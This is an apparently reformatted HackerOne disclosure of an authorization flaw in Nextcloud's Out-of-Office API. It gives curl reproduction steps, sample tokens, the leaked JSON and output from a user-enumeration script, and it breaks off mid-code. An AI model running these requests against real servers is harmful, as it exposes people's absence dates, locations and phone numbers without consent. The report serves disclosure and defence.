# BOLA/IDOR in Out-of-Office API allows any authenticated user to read other users' absence data

## Metadata
- **Source:** HackerOne
- **Report:** 3382343 | https://hackerone.com/reports/3382343
- **Submitted:** 2025-10-13
- **Reporter:** cyberjoker
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Insecure Direct Object Reference (IDOR)
- **CVEs:** None
- **Category:** web-api

## Summary
## Summary

The Out-of-Office (OOO) API endpoints at `/ocs/v2.php/apps/dav/api/v1/outOfOffice/{userId}` and `/ocs/v2.php/apps/dav/api/v1/outOfOffice/{userId}/now` suffer from a Broken Object Level Authorization (BOLA) vulnerability. Any authenticated user can retrieve the out-of-office data of any other user by manipulating the `userId` path parameter, without any ownership validation.

The vulner

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

## Summary

The Out-of-Office (OOO) API endpoints at `/ocs/v2.php/apps/dav/api/v1/outOfOffice/{userId}` and `/ocs/v2.php/apps/dav/api/v1/outOfOffice/{userId}/now` suffer from a Broken Object Level Authorization (BOLA) vulnerability. Any authenticated user can retrieve the out-of-office data of any other user by manipulating the `userId` path parameter, without any ownership validation.

The vulnerable endpoints are marked with `#[NoAdminRequired]`, meaning any logged-in user can access them. However, the controller (`OutOfOfficeController.php`) does not verify that the authenticated user is requesting their own data. This allows unauthorized access to sensitive personal information including:

- Vacation start and end dates
- Personal absence messages (which may contain phone numbers, travel destinations, health information)
- Replacement contact user IDs and display names
- Real-time absence status

This violates user privacy expectations and exposes sensitive data that could be used for social engineering, physical security threats (e.g., knowing when someone's home is empty), or corporate intelligence gathering.

---

## Steps To Reproduce

### Prerequisites
- Nextcloud server with version 32.0.0.13 (tested and confirmed vulnerable)
- Two user accounts: "bob" (attacker) and "alice" (victim)
- Alice has configured out-of-office data

### Reproduction Steps

**Step 1**: Create test environment

Set up a Nextcloud 32.0.0 instance with at least two users:

```bash
# Create users via OCC command
export OC_PASS=alice_password_123
docker exec -e OC_PASS -u www-data nextcloud-app php occ user:add --password-from-env --display-name="Alice Johnson" alice

export OC_PASS=bob_password_123
docker exec -e OC_PASS -u www-data nextcloud-app php occ user:add --password-from-env --display-name="Bob Attacker" bob
```

**Step 2**: Generate app passwords for testing

```bash
# Generate token for Alice (victim)
export NC_PASS=alice_password_123
docker exec -e NC_PASS -u www-data nextcloud-app php occ user:add-app-password alice --password-from-env

# Output example: 8m3Ea371mGIv21uxXjZfyJCKMxHw3pq7KGxNXiRoGgESGcDEqRfaGMAmplV8HvweKAgZ82CS

# Generate token for Bob (attacker)
export NC_PASS=bob_password_123
docker exec -e NC_PASS -u www-data nextcloud-app php occ user:add-app-password bob --password-from-env

# Output example: nmKXt1JUaq6fyZtHW6JRTX5N1juQRIVPFpOxtsLYjRzzSbDBWmK5kajsSNDO1ptVcmmb30Jv
```

**Step 3**: Configure Alice's out-of-office data

Using Alice's token, set her out-of-office with sensitive information:

```bash
curl -X POST "http://localhost:8088/ocs/v2.php/apps/dav/api/v1/outOfOffice/alice" \
  -H "Authorization: Bearer 8m3Ea371mGIv21uxXjZfyJCKMxHw3pq7KGxNXiRoGgESGcDEqRfaGMAmplV8HvweKAgZ82CS" \
  -H "OCS-APIRequest: true" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "firstDay=2025-12-20" \
  -d "lastDay=2026-01-05" \
  -d "status=On vacation" \
  -d "message=Away on family vacation in Aspen. Cell: 1-555-0123."

# Response: HTTP 200 OK - Data configured successfully
```

**Step 4**: Exploit the BOLA vulnerability

As user "bob", request alice's out-of-office data using Bob's token:

```bash
curl -s "http://localhost:8088/ocs/v2.php/apps/dav/api/v1/outOfOffice/alice" \
  -H "Authorization: Bearer nmKXt1JUaq6fyZtHW6JRTX5N1juQRIVPFpOxtsLYjRzzSbDBWmK5kajsSNDO1ptVcmmb30Jv" \
  -H "OCS-APIRequest: true"
```

**Expected behavior** (secure): HTTP 403 Forbidden - bob should not be able to access alice's data

**Actual behavior** (vulnerable): HTTP 200 OK with full OOO data:

```json
{
  "ocs": {
    "meta": {
      "status": "ok",
      "statuscode": 200,
      "message": "OK"
    },
    "data": {
      "id": 1,
      "userId": "alice",
      "firstDay": "2025-12-20",
      "lastDay": "2026-01-05",
      "status": "On vacation",
      "message": "Away on family vacation in Aspen. Cell: 1-555-0123.",
      "replacementUserId": "",
      "replacementUserDisplayName": ""
    }
  }
}
```

**VULNERABILITY CONFIRMED**: Bob successfully accessed Alice's private out-of-office data including:
- Vacation dates (December 20, 2025 - January 5, 2026)
- Travel destination (Aspen)
- Personal phone number (1-555-0123)
- 17-day absence period

**Step 5**: Verify real-time status endpoint also vulnerable

```bash
curl -s "http://localhost:8088/ocs/v2.php/apps/dav/api/v1/outOfOffice/alice/now" \
  -H "Authorization: Bearer nmKXt1JUaq6fyZtHW6JRTX5N1juQRIVPFpOxtsLYjRzzSbDBWmK5kajsSNDO1ptVcmmb30Jv" \
  -H "OCS-APIRequest: true"
```

Returns alice's current absence status without authorization check.

**Step 6**: Mass enumeration demonstration

Automated Python script successfully enumerated multiple users:

```bash
# Using the provided exploit_bola.py script
uv run python exploit_bola.py

# Output:
# ============================================================
# Nextcloud Out-of-Office BOLA Exploit
# ============================================================
# [*] Starting enumeration of 5 users...
# [*] Checking: admin... ❌ No data
# [*] Checking: alice... ✅ OUT OF OFFICE FOUND
#     First Day: 2025-12-20
#     Last Day: 2026-01-05
#     Message: Away on family vacation in Aspen. Cell: 1-555-0123.
# [*] Checking: bob... ❌ No data
# [*] Checking: charlie... ❌ No data
# [*] Checking: dave... ❌ No data
#
# [+] Extracted OOO data for 1 users
# [+] Results saved to: ooo_leak.json
```

**Exported Data** (ooo_leak.json):
```json
{
  "alice": {
    "id": 1,
    "userId": "alice",
    "firstDay": "2025-12-20",
    "lastDay": "2026-01-05",
    "status": "On vacation",
    "message": "Away on family vacation in Aspen. Cell: 1-555-0123.",
    "replacementUserId": "",
    "replacementUserDisplayName": ""
  }
}
```

This demonstrates successful mass enumeration and data exfiltration capability.

---

## Supporting Material/References

### Code References

**Vulnerable Controller**: `apps/dav/lib/Controller/OutOfOfficeController.php`

Lines 79-100 (getOutOfOffice method):
```php
#[NoAdminRequired]
#[ApiRoute(verb: 'GET', url: '/api/v1/outOfOffice/{userId}')]
public function getOutOfOffice(string $userId): DataResponse {
    try {
        // ⚠️ VULNERABILITY: No ownership validation
        // Missing check: if ($this->userId !== $userId) { return new DataResponse([], Http::STATUS_FORBIDDEN); }

        $data = $this->absenceService->getAbsence($userId);

        if ($data === null) {
            return new DataResponse([], Http::STATUS_NOT_FOUND);
        }
    } catch (DoesNotExistException) {
        return new DataResponse([], Http::STATUS_NOT_FOUND);
    }

    return new DataResponse([
        'id' => $data->getId(),
        'userId' => $data->getUserId(),
        'firstDay' => $data->getFirstDay(),
        'lastDay' => $data->getLastDay(),
        'status' => $data->getStatus(),
        'message' => $data->getMessage(),  // ⚠️ May contain sensitive personal information
        'replacementUserId' => $data->getReplacementUserId(),
        'replacementUserDisplayName' => $data->getReplacementUserDisplayName(),
    ]);
}
```

Lines 52-68 (getCurrentOutOfOfficeData method):
```php
#[NoAdminRequired]
#[ApiRoute(verb: 'GET', url: '/api/v1/outOfOffice/{userId}/now')]
public function getCurrentOutOfOfficeData(string $userId): DataResponse {
    $user = $this->userManager->get($userId);

    if ($user === null) {
        return new DataResponse([], Http::STATUS_NOT_FOUND);
    }

    try {
        // ⚠️ VULNERABILITY: No ownership validation
        $data = $this->absenceService->getCurrentAbsence($user);

        if ($data === null) {
            return new DataResponse([], Http::STATUS_NOT_FOUND);
        }
    } catch (DoesNotExistException) {
        return new DataResponse([], Http::STATUS_NOT_FOUND);
    }

    return new DataResponse($data->jsonSerialize());
}
```

**Route Definitions**: `apps/dav/appinfo/routes.php` (lines 12-18)

**Comparison with Secure Endpoint**:

For reference, the `setOutOfOffice` method (lines 117-168) correctly validates ownership:
```php
#[No

</details>

---
*Analysed by Claude on 2026-05-24*
